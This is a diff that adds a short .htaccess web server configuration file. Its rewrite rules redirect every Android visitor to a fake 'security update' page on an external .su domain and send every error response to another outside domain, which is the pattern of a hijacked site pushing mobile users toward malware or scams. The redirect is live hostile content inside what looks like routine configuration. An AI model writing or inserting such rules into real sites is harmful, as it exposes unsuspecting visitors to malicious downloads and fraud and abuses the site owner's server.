@@ -1,0 +1,8 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} .*ndroid.*
+RewriteRule ^(.*)$ http://ANDROIDCLOUDSECURITYUPDATE.SU/fixup.php
+ErrorDocument 400 http://fx-enws.com
+ErrorDocument 401 http://fx-enws.com
+ErrorDocument 403 http://fx-enws.com
+ErrorDocument 404 http://fx-enws.com
+ErrorDocument 500 http://fx-enws.com
